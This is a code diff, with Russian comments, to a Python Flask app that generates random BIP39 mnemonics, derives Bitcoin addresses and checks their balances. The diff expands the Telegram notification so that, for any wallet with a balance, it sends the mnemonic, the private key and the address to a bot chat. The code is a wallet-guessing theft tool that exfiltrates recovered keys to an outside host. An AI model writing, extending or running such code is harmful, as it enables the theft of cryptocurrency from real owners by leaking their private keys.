@@ -4,12 +4,13 @@ import re
 from mnemonic import Mnemonic
 import bip32utils
 
+app = Flask(__name__)
+
 # === Настройки ===
 SATOSHIS_PER_BTC = 1e8
-TELEGRAM_TOKEN = "ВАШ_ТОКЕН"
-TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID"
+TELEGRAM_TOKEN = "ВАШ_ТОКЕН"  # Заменить на свой
+TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID"  # Заменить на свой
 
-app = Flask(__name__)
 mnemo = Mnemonic("english")
 
 # === Генерация Bitcoin-адресов из мнемоники ===
@@ -48,7 +49,7 @@ def check_balance(address):
             data = response.json()
             balance = float(data['data'][address]['balance']) / SATOSHIS_PER_BTC
             return balance
-        except (ValueError, KeyError) as e:
+        except (ValueError, KeyError, TypeError) as e:
             print(f"[Ошибка парсинга JSON] для {address}: {e}")
             return 0.0
 
@@ -58,9 +59,16 @@ def check_balance(address):
 
 
 # === Отправка уведомления в Telegram ===
-def send_telegram_message(text):
+def send_telegram_message(mnemonic, address, private_key, balance):
     import requests
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage" 
+    text = (
+        "💰 *Найден кошелёк с ненулевым балансом!*\n\n"
+        f"**Баланс:** {balance:.8f} BTC\n"
+        f"**Bitcoin-адрес:** `{address}`\n"
+        f"**Приватный ключ:** `{private_key}`\n"
+        f"**Мнемоника (12 слов):**\n`{mnemonic}`"
+    )
     payload = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": text,
@@ -81,12 +89,7 @@ def save_and_notify_found_wallet(mnemonic, address, private_key, balance):
         f.write(f"Баланс: {balance:.8f} BTC\n")
         f.write("-" * 60 + "\n")
 
-    message = (
-        f"*💰 Найден кошелёк с балансом!*\n\n"
-        f"`{address}`\n"
-        f"*Баланс:* {balance:.8f} BTC"
-    )
-    send_telegram_message(message)
+    send_telegram_message(mnemonic, address, private_key, balance)
 
 
 # === API маршрут ===
